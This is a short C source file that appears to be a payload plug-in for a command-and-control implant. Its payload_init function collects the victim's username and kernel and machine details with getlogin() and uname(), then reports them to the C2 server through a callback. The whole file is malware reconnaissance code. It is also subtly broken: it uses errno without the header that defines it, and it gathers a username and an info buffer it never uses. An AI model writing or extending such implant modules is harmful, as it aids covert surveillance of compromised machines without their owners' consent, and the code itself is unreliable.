#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

#include "../OutputFormatter.h" // Required!

typedef void(*output_func)(const char* fmt, ...); // For printing output on C2 server.

int payload_init(output_func output) {

    // Get username.
    char* username = getlogin();

    // Get computer information.
    struct utsname buffer;
    if (uname(&buffer) < 0) {
        output("Failed to get uname information! Error code: %d\n", errno);
        return 1;
    }

    // Put all together.
    int infoSize = 65*3;
    char info[infoSize];

    snprintf(info, infoSize, "%s %s %s", buffer.release, buffer.machine, buffer.version); // From OutputFormatter.h

    output("%s %s %s", buffer.release, buffer.machine, buffer.version);
    return 0;
}
